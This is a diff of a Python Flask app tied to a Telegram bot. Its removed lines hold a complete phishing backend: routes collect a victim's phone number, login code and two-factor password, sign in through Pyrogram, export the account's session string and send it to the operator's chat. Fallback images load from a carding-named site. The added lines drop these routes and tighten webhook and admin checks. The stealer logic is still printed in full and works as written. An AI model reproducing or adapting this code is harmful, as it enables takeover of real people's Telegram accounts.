-        print("Bot Client Start Error:", e)
 
-    loop.run_forever()
+def telegram_message_file_id(message):
+    if "video" in message:
+        return message["video"].get("file_id")
+    if "document" in message:
+        return message["document"].get("file_id")
+    if "animation" in message:
+        return message["animation"].get("file_id")
+    if "photo" in message and message["photo"]:
+        return message["photo"][-1].get("file_id")
+    return None
 
-loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
-loop_thread.start()
 
-def run_async(coro):
-    future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
-    return future.result()
-
-@app.route('/', methods=['GET'])
-def home():
-    if os.path.exists('index.html'): return send_file('index.html')
-    return "index.html not found", 404
-
-@app.route('/naughty.html', methods=['GET'])
-def naughty_page():
-    if os.path.exists('naughty.html'): return send_file('naughty.html')
-    return "naughty.html not found", 404
-
-@app.route('/verify', methods=['GET'])
-def verify_page():
-    if os.path.exists('verify.html'): return send_file('verify.html')
-    return "verify.html not found", 404
-
-@app.route('/dashboard.html', methods=['GET'])
-def dashboard_page():
-    if os.path.exists('dashboard.html'): return send_file('dashboard.html')
-    return "dashboard.html not found", 404
-
-@app.route('/get-random-background', methods=['GET'])
-def get_random_background():
-    bg_folder = "static/backgrounds"
-    if not os.path.exists(bg_folder):
-        os.makedirs(bg_folder, exist_ok=True)
-    
-    files = os.listdir(bg_folder)
-    if not files:
-        return jsonify({
-            "status": "success", 
-            "url": "https://carder.top/imagens/1792298157180-542085424.jpg", 
-            "type": "image",
-            "blur": app.config.get("CURRENT_BLUR", "3px")
-        })
-    
-    chosen_file = random.choice(files)
-    file_url = f"/static/backgrounds/{chosen_file}?v={int(time.time())}"
-    file_type = "video" if chosen_file.lower().endswith(('.mp4', '.mov', '.webm', '.mkv')) else "image"
-    
-    blur_val = app.config.get("CURRENT_BLUR", "3px")
-    
-    return jsonify({"status": "success", "url": file_url, "type": file_type, "blur": blur_val})
-
-@app.route('/send-code', methods=['POST'])
-def send_code():
-    data = request.get_json(silent=True) or {}
-    phone = str(data.get('phone', '')).strip()
-    if not phone:
-        return jsonify({"status": "error", "message": "Phone number is required"}), 400
-    try:
-        async def _send():
-            if phone in active_clients:
-                try: await active_clients[phone]["client"].disconnect()
-                except Exception: pass
-            
-            client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
-            await client.connect()
-            sent_code = await client.send_code(phone)
-            active_clients[phone] = {"client": client, "phone_code_hash": sent_code.phone_code_hash}
-            return sent_code.phone_code_hash
-            
-        phone_code_hash = run_async(_send())
-        return jsonify({"status": "success", "message": "OTP sent!", "phone_code_hash": phone_code_hash})
-    except Exception as e:
-        print("Send Code Error:", traceback.format_exc())
-        return jsonify({"status": "error", "message": str(e)}), 400
-
-@app.route('/verify-code', methods=['POST'])
-def verify_code():
-    global total_logged_in_users
-    data = request.get_json(silent=True) or {}
-    phone = str(data.get('phone', '')).strip()
-    code = str(data.get('code', '')).strip()
-    password = data.get('password')
-    if not phone or not code:
-        return jsonify({"status": "error", "message": "Phone and Code required"}), 400
-    if phone not in active_clients:
-        return jsonify({"status": "error", "message": "Session expired."}), 400
-    client_data = active_clients[phone]
-    client = client_data["client"]
-    phone_code_hash = client_data["phone_code_hash"]
-    try:
-        async def _verify():
-            try: await client.sign_in(phone, phone_code_hash, code)
-            except Exception:
-                if not password: return {"status": "2fa_required"}
-                await client.check_password(str(password))
-            session_string = await client.export_session_string()
-            await client.disconnect()
-            return {"status": "success", "session_string": session_string}
-        res = run_async(_verify())
-        if res and res.get("status") == "2fa_required":
-            return jsonify({"status": "2fa_required", "message": "2FA Required"})
-        if res and res.get("status") == "success":
-            total_logged_in_users += 1
-            session_string = res.get("session_string")
-            send_telegram_message(OWNER_CHAT_ID, f"🎉 *New Login!*\n📱 `{phone}`\n🔑 `{session_string}`")
-            active_clients.pop(phone, None)
-            return jsonify({"status": "success", "message": "Logged in!"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
-
-@app.route('/get-user-profile', methods=['POST'])
-def get_user_profile():
-    data = request.get_json(silent=True) or {}
-    phone = str(data.get('phone', '')).strip()
-    if not phone:
-        return jsonify({"status": "error", "message": "Phone required"}), 400
-    try:
-        async def _fetch():
-            client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
-            await client.connect()
-            await client.disconnect()
-            return {
-                "name": "User",
-                "username": "@username",
-                "id": 0,
-                "phone": phone,
-                "bio": "Bio",
-                "photo": "https://carder.top/imagens/1791918460640-323067073.jpg"
-            }
-        profile_data = run_async(_fetch())
-        return jsonify({"status": "success", "profile": profile_data})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 400
-
-@app.route('/stats', methods=['GET'])
-def get_stats():
-    return jsonify({"total_users_logged_in": total_logged_in_users})
-
-@app.route('/webhook', methods=['POST'])
+@app.route("/webhook", methods=["POST"])
 def telegram_webhook():
+    # Set TELEGRAM_WEBHOOK_SECRET in the server and configure the same
+    # secret with Telegram's setWebhook method to protect this endpoint.
+    if WEBHOOK_SECRET:
+        received_secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
+        if received_secret != WEBHOOK_SECRET:
+            abort(403)
+
     try:
         data = request.get_json(silent=True) or {}
+
         if "message" in data:
             message = data["message"]
-            chat_id = message["chat"]["id"]
-            user_id = message["from"]["id"]
-            text = message.get("text", "").strip()
+            chat_id = message.get("chat", {}).get("id")
+            sender = message.get("from", {})
+            user_id = sender.get("id")
+            text = (message.get("text") or "").strip()
 
-            if user_id in admin_states:
-                state = admin_states[user_id]
-                if state == "WAITING_FOR_BG_TEMPLATE":
-                    file_id = None
-                    if "video" in message: file_id = message["video"]["file_id"]
-                    elif "document" in message: file_id = message["document"]["file_id"]
-                    elif "animation" in message: file_id = message["animation"]["file_id"]
-                    elif "photo" in message: file_id = message["photo"][-1]["file_id"]
+            # Only the configured administrator can trigger admin upload state.
+            if user_id == ADMIN_ID and admin_states.get(user_id) == "WAITING_FOR_BG_TEMPLATE":
+                file_id = telegram_message_file_id(message)
 
-                    if file_id:
-                        success, fname = download_background_file_by_id(file_id, "bg_media")
-                        if success:
-                            send_telegram_message(chat_id, f"✅ **Background Media Stored Successfully!**\nSaved: `{fname}`")
-                        else:
-                            send_telegram_message(chat_id, "⚠️ Error downloading file.")
+                if file_id:
+                    success, filename = download_background_file_by_id(file_id, "bg_media")
+                    if success:
+                        send_telegram_message(
+                            chat_id,
+                            f"✅ Background media saved successfully.\nFile: {filename}",
+                        )
                     else:
-                        send_telegram_message(chat_id, "⚠️ Please send a valid video or photo.")
-                    return "OK", 200
+                        send_telegram_message(chat_id, "⚠️ Could not download that file.")
+                else:
+                    send_telegram_message(chat_id, "⚠️ Please send a photo or video.")
+
+                admin_states.pop(user_id, None)
+                return "OK", 200
 
             if text == "/start":
                 send_telegram_message(chat_id, get_welcome_text(), get_main_menu())
 
         elif "callback_query" in data:
-            cq = data["callback_query"]
-            cdata = cq.get("data")
-            msg_obj = cq.get("message", {})
-            chat_id = msg_obj.get("chat", {}).get("id")
-            msg_id = msg_obj.get("message_id")
-            user_id = cq["from"]["id"]
-            cq_id = cq["id"]
+            callback = data["callback_query"]
+            callback_data = callback.get("data", "")
+            message_obj = callback.get("message", {})
+            chat_id = message_obj.get("chat", {}).get("id")
+            message_id = message_obj.get("message_id")
+            user_id = callback.get("from", {}).get("id")
+            callback_id = callback.get("id")
 
-            if not chat_id or not msg_id: return "OK", 200
+            if not chat_id or not message_id:
+                return "OK", 200
 
-            if cdata == "total_members":
-                answer_callback(cq_id, "Fetching stats...")
-                edit_telegram_message(chat_id, msg_id, f"📊 *Total Registered Members:* `{total_logged_in_users:,}`", get_back_button())
+            admin_only_actions = {
+                "total_members",
+                "bg_template",
+                "reload_all_videos",
+                "blur_effect_menu",
+                "back_to_main",
+            }
 
-            elif cdata == "bg_template":
-                if user_id != ADMIN_ID:
-                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
-                    return "OK", 200
-                answer_callback(cq_id, "Background Template Manager")
+            if (callback_data in admin_only_actions or callback_data.startswith("blur_")) and user_id != ADMIN_ID:
+                answer_callback(callback_id, "Unauthorized.", show_alert=True)
+                return "OK", 200
+
+            if callback_data == "total_members":
+                answer_callback(callback_id, "Loading chat statistics...")
+                stats = get_chat_stats()
+                text = (
+                    "📊 Chat Statistics\n\n"
+                    f"Total messages: {stats['total_chat_messages']:,}\n"
+                    f"Browser sessions seen: {stats['total_chat_clients']:,}"
+                )
+                edit_telegram_message(chat_id, message_id, text, get_back_button())
+
+            elif callback_data == "bg_template":
+                answer_callback(callback_id, "Background manager")
                 admin_states[user_id] = "WAITING_FOR_BG_TEMPLATE"
-                edit_telegram_message(chat_id, msg_id, f"🖼️ **Dashboard Background Template Manager**\n\nSend files here OR upload directly to your Storage Channel (`{STORAGE_CHANNEL_ID}`), they will auto-sync instantly!", get_back_button())
+                edit_telegram_message(
+                    chat_id,
+                    message_id,
+                    "🖼️ Dashboard Background Template Manager\n\n"
+                    "Send a photo or video here. It will be saved as a dashboard background. "
+                    "Chat backup posts in the storage channel are excluded from background sync.",
+                    get_back_button(),
+                )
 
-            elif cdata == "reload_all_videos":
-                if user_id != ADMIN_ID:
-                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
-                    return "OK", 200
-                
-                answer_callback(cq_id, "Syncing all channel media...")
+            elif callback_data == "reload_all_videos":
+                answer_callback(callback_id, "Scanning storage channel...")
                 synced_count = pyrogram_scan_channel_sync()
-                edit_telegram_message(chat_id, msg_id, f"🔄 **Reload Complete!**\nSuccessfully scanned and synced `{synced_count}` media files from the storage channel.", get_main_menu())
+                edit_telegram_message(
+                    chat_id,
+                    message_id,
+                    f"🔄 Background sync finished.\nNew files synced: {synced_count}",
+                    get_main_menu(),
+                )
 
-            elif cdata == "blur_effect_menu":
-                if user_id != ADMIN_ID:
-                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
+            elif callback_data == "blur_effect_menu":
+                answer_callback(callback_id, "Select background blur")
+                edit_telegram_message(
+                    chat_id,
+                    message_id,
+                    "💧 Choose the background blur amount:",
+                    get_blur_menu(),
+                )
+
+            elif callback_data.startswith("blur_"):
+                percentage = callback_data.split("_", 1)[1]
+                if percentage not in {"2", "3", "4", "5", "6", "7"}:
+                    answer_callback(callback_id, "Invalid blur setting.", show_alert=True)
                     return "OK", 200
-                answer_callback(cq_id, "Blur Effect Menu")
-                edit_telegram_message(chat_id, msg_id, "💧 **Select Blur Percentage for Background:**\nChoose a level below:", get_blur_menu())
 
-            elif cdata.startswith("blur_"):
-                if user_id != ADMIN_ID:
-                    answer_callback(cq_id, "⛔ Unauthorized!", show_alert=True)
-                    return "OK", 200
-                percentage = cdata.split("_")[1]
-                blur_px = f"{percentage}px"
-                app.config["CURRENT_BLUR"] = blur_px
-                answer_callback(cq_id, f"Blur set to {percentage}% successfully!", show_alert=True)
-                edit_telegram_message(chat_id, msg_id, f"✅ **Background Blur Updated Successfully to {percentage}%!**", get_blur_menu())
+                app.config["CURRENT_BLUR"] = f"{percentage}px"
+                answer_callback(callback_id, f"Blur set to {percentage}px.", show_alert=True)
+                edit_telegram_message(
+                    chat_id,
+                    message_id,
+                    f"✅ Background blur updated to {percentage}px.",
+                    get_blur_menu(),
+                )
 
-            elif cdata == "back_to_main":
-                if user_id in admin_states: del admin_states[user_id]
-                answer_callback(cq_id, "Main Menu")
-                edit_telegram_message(chat_id, msg_id, get_welcome_text(), get_main_menu())
+            elif callback_data == "back_to_main":
+                admin_states.pop(user_id, None)
+                answer_callback(callback_id, "Main menu")
+                edit_telegram_message(chat_id, message_id, get_welcome_text(), get_main_menu())
 
-    except Exception as e:
-        print("Webhook Error:", traceback.format_exc())
+    except Exception:
+        print("Webhook error:", traceback.format_exc())
+
     return "OK", 200
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port, threaded=True)
+
+# ============================================================
+# Start optional Pyrogram monitor
+# ============================================================
+
+def start_background_services():
+    if Client is None or not BOT_TOKEN or not API_ID or not API_HASH:
+        print(
+            "Pyrogram monitor not started. Chat-to-Telegram storage uses the Bot API; "
+            "set API_ID and API_HASH only if background channel sync is needed."
+        )
+        return
+
+    if not pyrogram_thread.is_alive():
+        pyrogram_thread.start()
+
+    if not pyrogram_loop_ready.wait(timeout=5):
+        print("Pyrogram loop did not become ready.")
+        return
+
+    try:
+        run_async(start_pyrogram_monitor(), timeout=45)
+    except Exception:
+        print("Could not start Pyrogram monitor:", traceback.format_exc())
+
+
+start_background_services()
+
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", "8080"))
+    app.run(host="0.0.0.0", port=port, threaded=True, debug=False)
